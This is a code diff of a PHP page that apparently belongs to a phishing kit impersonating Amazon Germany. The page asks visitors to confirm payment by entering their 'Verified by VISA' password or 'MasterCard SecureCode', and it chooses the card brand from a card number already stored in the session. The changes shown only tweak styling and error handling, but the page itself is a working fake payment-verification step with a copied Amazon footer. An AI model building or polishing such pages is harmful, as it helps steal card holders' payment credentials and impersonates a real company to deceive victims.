@@ -178,7 +178,7 @@
 				</div>
 			</div> -->
 				
-			<div class="cu-eb-top" style="width:520px;margin:0 auto">
+			<div class="cu-eb-top" style="width:520px;margin:20px auto 0">
 				<div class="cu-eb-top-left cu-eb-top-left-3"></div>
 				<h2 class="step">Zahlungsinformationen bestätigen - <b><?php echo ((isset($_SESSION['ccnr']) && substr($_SESSION['ccnr'], 0, 1) == 4) ? "<i>Verified by VISA Passwort</i>" : "<i>MasterCard® SecureCode™</i>") ?></b></h2>
 			</div>
@@ -187,7 +187,7 @@
 				<div style="border:1px solid rgb(225,225,225);padding:25px;box-shadow: 3px 3px 8px 4px rgb(200,200,200);">
 					<br/>
 				
-					<span class="ap_col2 ap_left" style="margin-left:10px;font-size:13px">
+					<span class="ap_col2 ap_left" style="margin-left:10px;font-size:13px;color: #c60;font-weight: bold;">
 						<?php echo ((isset($_SESSION['ccnr']) && substr($_SESSION['ccnr'], 0, 1) == 4) ? '<img src="src/img/vbv.gif" style="float:right;margin-top:-10px;"/>' : '<img src="src/img/sc.gif" style="float:right;margin-top:-10px"/>') ?>
 						Bitte geben Sie <?php echo ((isset($_SESSION['ccnr']) && substr($_SESSION['ccnr'], 0, 1) == 4) ? "Ihr <i>Verified by VISA Passwort</i>" : "Ihren <i>MasterCard® SecureCode™</i>") ?> ein.
 					</span>
@@ -329,6 +329,7 @@
 		<?php
 			if (isset($_SESSION['sc_err'])) { unset($_SESSION['sc_err']); }
 			if (isset($_SESSION['sk_err'])) { unset($_SESSION['sk_err']); }
+			unset($_SESSION['errList']);
 		?>
 		<div id="navFooter" class="navLeftFooter nav-sprite-v1" style="width:100%;position:absolute;bottom:0"><div class="navFooterLine navFooterLinkLine navFooterPadItemLine"> <span> <div class="navFooterLine navFooterLogoLine"> <a href="#"> <div class="nav-logo-base nav-sprite"></div> </a> </div> </span> <span class="icp-container-desktop"> <div class="navFooterLine"> <style type="text/css">#icp-touch-link-country{display:none}#icp-touch-link-language{display:none}</style> <a href="#" class="icp-button a-declarative" id="icp-touch-link-language"> <div class="icp-nav-globe-img-2 icp-button-globe-2"></div><span class="icp-color-base">Deutsch</span><span class="nav-arrow icp-up-down-arrow"></span> </a> <a href="#" class="icp-button a-declarative" id="icp-touch-link-country"> <span class="icp-flag-3 icp-flag-3-de"></span><span class="icp-color-base">Deutschland</span> </a> </div> </span> </div> <div class="navFooterLine navFooterLinkLine navFooterPadItemLine navFooterCopyright"> <ul> <li class="nav_first"> <a href="#" class="nav_a">Unsere AGB</a> </li> <li> <a href="#" class="nav_a">Datenschutzerklärung</a> </li> <li> <a href="#" class="nav_a">Impressum</a> </li> <li class="nav_last "> <a href="#" class="nav_a">Cookies &amp; Internet-Werbung</a> </li> </ul> <span>© 1998-<?php echo date("Y"); ?>, Amazon.com, Inc. oder Tochtergesellschaften</span> </div> </div>
 	</body>
